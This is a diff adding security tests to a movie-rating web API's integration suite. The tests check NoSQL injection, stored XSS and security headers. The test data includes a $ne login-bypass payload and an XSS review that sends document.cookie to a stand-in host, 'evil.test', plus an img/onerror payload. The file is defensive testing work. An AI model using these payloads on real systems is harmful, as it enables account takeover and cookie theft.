@@ -398,6 +398,71 @@ async function run() {
 
   /* --------------------------- auth boundaries --------------------------- */
 
+  /* -------------------------------- security ------------------------------ */
+
+  section('Injection and stored XSS');
+
+  // NoSQL injection: an object where a string belongs. Without the sanitiser
+  // this is `find where email != null` — the first user in the collection, with
+  // only the password compare left standing.
+  const nosql = await api()
+    .post('/api/auth/login')
+    .send({ email: { $ne: null }, password: { $ne: null } });
+  check('a $ne login payload is refused', nosql.status === 401, `got ${nosql.status}`);
+  check('it does not leak a token', !nosql.body?.data?.token);
+
+  const nosqlQuery = await api()
+    .get('/api/users/search')
+    .query({ 'q[$ne]': '' })
+    .set('Authorization', `Bearer ${ada}`);
+  check('an operator in the query string is harmless', nosqlQuery.status === 200, `got ${nosqlQuery.status}`);
+
+  // Stored XSS: the payload must not survive into the stored document.
+  const xss = await api()
+    .post('/api/ratings')
+    .set('Authorization', `Bearer ${ada}`)
+    .send({
+      contentId: '680',
+      contentType: 'movie',
+      contentTitle: 'Pulp Fiction',
+      rating: 4,
+      review: 'Great<script>fetch("//evil.test?c="+document.cookie)</script> film <img src=x onerror=alert(1)>',
+    });
+  // Accepted, not rejected: the payload is stripped and the review is kept.
+  // Refusing outright would punish the user for a defence they cannot see.
+  check('a review carrying script tags is accepted', xss.status === 201, `got ${xss.status}`);
+  const storedReview = String(xss.body?.data?.rating?.review ?? '');
+  check('the script tag is gone', !/<script/i.test(storedReview), storedReview);
+  check('its body is gone too, not just the tags', !storedReview.includes('document.cookie'), storedReview);
+  check('the img/onerror payload is gone', !/onerror/i.test(storedReview), storedReview);
+  check('the human text survives', storedReview.includes('Great') && storedReview.includes('film'), storedReview);
+
+  const xssName = await api()
+    .put('/api/users/me')
+    .set('Authorization', `Bearer ${ada}`)
+    .send({ displayName: 'Ada<script>alert(1)</script>' });
+  check(
+    'a display name cannot carry markup',
+    !/<script/i.test(String(xssName.body?.data?.user?.displayName ?? '')),
+    String(xssName.body?.data?.user?.displayName),
+  );
+
+  const markupOnly = await api()
+    .put('/api/users/me')
+    .set('Authorization', `Bearer ${ada}`)
+    .send({ displayName: '<script>alert(1)</script>' });
+  check('a name made only of markup is refused', markupOnly.status === 422, `got ${markupOnly.status}`);
+
+  section('Security headers');
+
+  const headers = (await api().get('/api/health')).headers as Record<string, string>;
+  check('X-Powered-By is not advertised', headers['x-powered-by'] === undefined);
+  check('framing is denied', headers['x-frame-options'] === 'DENY', headers['x-frame-options']);
+  check('MIME sniffing is off', headers['x-content-type-options'] === 'nosniff');
+  check('no referrer leaks', headers['referrer-policy'] === 'no-referrer', headers['referrer-policy']);
+  check('a CSP is set', Boolean(headers['content-security-policy']));
+  check('HSTS is set', Boolean(headers['strict-transport-security']));
+
   section('Auth boundaries');
 
   const noToken = await api().get('/api/watchlist');
